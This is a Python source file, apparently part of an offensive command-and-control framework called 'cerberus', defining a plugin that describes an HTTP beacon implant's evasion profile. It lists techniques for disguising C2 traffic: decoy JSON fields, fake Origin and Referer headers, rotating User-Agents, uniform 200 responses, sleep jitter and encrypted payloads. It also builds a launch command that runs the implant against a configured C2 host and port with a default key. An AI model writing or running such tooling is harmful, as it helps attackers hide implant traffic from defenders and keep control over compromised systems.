"""HTTP beacon stealth profile helper."""

from __future__ import annotations

from typing import Any

from cerberus.core.http_stealth import DEFAULT_URIS
from cerberus.core.phase import Phase
from cerberus.core.plugin_api import OpsecLevel, Plugin, PluginMeta, register_plugin


@register_plugin
class EvasionHttpProfilePlugin(Plugin):
    meta = PluginMeta(
        name="evasion_http_profile",
        description="Show stealth HTTP beacon URI/header profile and sample env launch",
        phase=list(Phase),
        opsec=OpsecLevel.SAFE,
        requires=[],
        produces=[],
    )

    async def run(self, **kwargs: Any) -> dict[str, Any]:
        host = self.config.lhost
        port = self.config.c2_port
        key = getattr(self.config, "c2_key", "cerberus-default-key-change-me")
        sample = (
            f"CERBERUS_C2={host}:{port} CERBERUS_KEY='{key}' "
            f"CERBERUS_SLEEP=20 CERBERUS_JITTER=50 "
            f"python3 cerberus/implants/http_beacon.py"
        )
        return {
            "success": True,
            "message": "HTTP stealth profile",
            "uris": DEFAULT_URIS,
            "features": [
                "random benign URI per request",
                "JSON wrapper with decoy fields (v/ts/src/rid/meta)",
                "base64 payload field (not raw C2 framing)",
                "Cookie sid=beacon_id",
                "rotating User-Agent + Accept-Language",
                "fake Origin/Referer",
                "200 OK JSON responses (no 204/400 signalling)",
                "sleep jitter",
                "AES-GCM inside payload when CERBERUS_KEY set",
            ],
            "launch": sample,
        }
